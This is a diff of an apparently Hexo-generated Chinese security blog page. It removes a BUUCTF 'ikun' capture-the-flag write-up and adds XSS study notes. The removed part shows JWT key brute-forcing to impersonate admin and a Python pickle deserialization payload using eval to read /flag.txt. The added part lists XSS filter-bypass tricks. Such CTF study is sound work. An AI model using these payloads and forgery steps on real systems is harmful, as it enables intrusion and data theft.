-<p>跑的有点慢,找到了lv6发现买不起.应该是要抓包修改折扣.然后拿到后台的地址.<br>但需要权限，这里涉及JWT破解,先将JWT base64解码一下,看到username是我自己的登陆名5，这里需要改为admin<br>后边解码不出来因为经过了sha256，需要破解key<br>找了一个工具破的破解工具c-jwt-cracker,爆破密码1Kun.<br>登录之后有一个<a href="http://www.zip,打开之后找到了一个python反序列化的地方，在admin.py中有一个" target="_blank" rel="noopener">www.zip,打开之后找到了一个python反序列化的地方，在admin.py中有一个</a><br>p=pickle.loads(urllib.unquote(become))<br>用py2跑<br>py3序列化pickle.dumps之后的结果和py2的不一样<br>怀疑是库的问题</p>
-<p>这里用了Pickle协议的方法<strong>reduce</strong>(self)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&apos;/flag.txt&apos;,&apos;r&apos;).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line">print a</span><br></pre></td></tr></table></figure>
-
-<p>这样就可以打印flag.txt里的内容了<br>将生成的payload传给become<br>拿到flag.</p>
-
+<p>先对 a标签做html解码 ，然后href做url解码，发现js协议，再做js解码 。<br>ps：注意这里的javascript是协议名，被转义或编码后无用。 </p>
+<h1 id="0x10-xss漏洞挖掘"><a href="#0x10-xss漏洞挖掘" class="headerlink" title="0x10 xss漏洞挖掘"></a>0x10 xss漏洞挖掘</h1><h1 id="寻找可控点，确认输出位置，确认是否进行过滤和html实体编码。"><a href="#寻找可控点，确认输出位置，确认是否进行过滤和html实体编码。" class="headerlink" title="寻找可控点，确认输出位置，确认是否进行过滤和html实体编码。"></a>寻找可控点，确认输出位置，确认是否进行过滤和html实体编码。</h1><p>以下标签中间不可以进行解析：<title>,<textarea>,<xmp>,<iframe>,<noscript>,<noframes>,<plaintext>. 0x11 绕过 </p>
+<p>1.宽字节逃逸<br>        2.利用自动autofocus。<br>        3.replace替换。<br>        4.html编码后加0绕过。<br>        5.firefox端口为0不跳转。<br>        6.php的header函数一旦遇到\r,\n,\0,会导致location不跳转。<br>        7.firefox强制下载<br>        8.文件上传导致xss<br>        9.rpo相对路径覆盖 </p>
+</script></p>
       
     </div>
     
@@ -451,8 +521,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/12/25/pwnable.kr/" rel="next" title="pwnable.kr">
-                <i class="fa fa-chevron-left"></i> pwnable.kr
+              <a href="/2020/06/22/2020网鼎杯朱雀组WEB——NMAP&PHPWEB/" rel="next" title="2020网鼎杯朱雀组WEB-NMAP&PHPWEB">
+                <i class="fa fa-chevron-left"></i> 2020网鼎杯朱雀组WEB-NMAP&PHPWEB
               </a>
             
           </div>
@@ -461,8 +531,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/12/25/http-smuggle/" rel="prev" title="http-smuggle">
-                http-smuggle <i class="fa fa-chevron-right"></i>
+              <a href="/2020/07/30/XSS中常见标签利用以及XSS-labs通关攻略/" rel="prev" title="XSS中常见标签利用以及XSS-labs通关攻略">
+                XSS中常见标签利用以及XSS-labs通关攻略 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -810,7 +880,7 @@ var jiathis_config={
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#jwt基础知识"><span class="nav-number">1.</span> <span class="nav-text">jwt基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JSON-web-token是什么"><span class="nav-number">1.1.</span> <span class="nav-text">JSON web token是什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#什么时候你应该用JSON-Web-Tokens"><span class="nav-number">1.2.</span> <span class="nav-text">什么时候你应该用JSON Web Tokens</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JSON-Web-Token的结构是什么样的"><span class="nav-number">1.3.</span> <span class="nav-text">JSON Web Token的结构是什么样的</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BUUCTF-ikun"><span class="nav-number">2.</span> <span class="nav-text">BUUCTF ikun</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-用途"><span class="nav-number">1.</span> <span class="nav-text">0x00 用途</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#盗取cookie信息-水坑探针-挖矿-蠕虫-沙盒逃逸-代理-信息收集"><span class="nav-number">2.</span> <span class="nav-text">盗取cookie信息 水坑探针 挖矿 蠕虫 沙盒逃逸 代理 信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#confirm-console-log-0x02-cookie"><span class="nav-number">3.</span> <span class="nav-text">confirm console.log 0x02 cookie</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#secure是在安全环境下才会将cookie进行发送，比如https。证书要被认可。"><span class="nav-number">4.</span> <span class="nav-text">secure是在安全环境下才会将cookie进行发送，比如https。证书要被认可。</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-cookie操作"><span class="nav-number">5.</span> <span class="nav-text">0x04 cookie操作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#修改cookie：直接赋值即可，但是要注意path-domain的一致性，否则不会修改，而是添加一个新cookie。"><span class="nav-number">6.</span> <span class="nav-text">修改cookie：直接赋值即可，但是要注意path/domain的一致性，否则不会修改，而是添加一个新cookie。</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-xss基础"><span class="nav-number">7.</span> <span class="nav-text">0x06 xss基础</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#反射型：恶意代码存在于url中。点击才会触发，隐蔽性较差。"><span class="nav-number">8.</span> <span class="nav-text">反射型：恶意代码存在于url中。点击才会触发，隐蔽性较差。</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-JSONP"><span class="nav-number">8.1.</span> <span class="nav-text">1.JSONP</span></a></li></ol></li></ol></div>
             
 
           </div>
